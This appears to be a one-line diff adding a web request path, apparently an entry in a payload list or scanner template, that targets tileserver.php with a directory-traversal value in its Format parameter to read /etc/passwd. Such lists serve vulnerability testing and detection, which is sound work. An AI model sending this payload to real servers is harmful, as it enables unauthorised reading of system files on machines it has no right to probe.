@@ -1,0 +1,1 @@
+/tileserver.php/x/1/1/1?Format=/../../../../../../../../../../../../../../etc/passwd&Request=x&layer=.
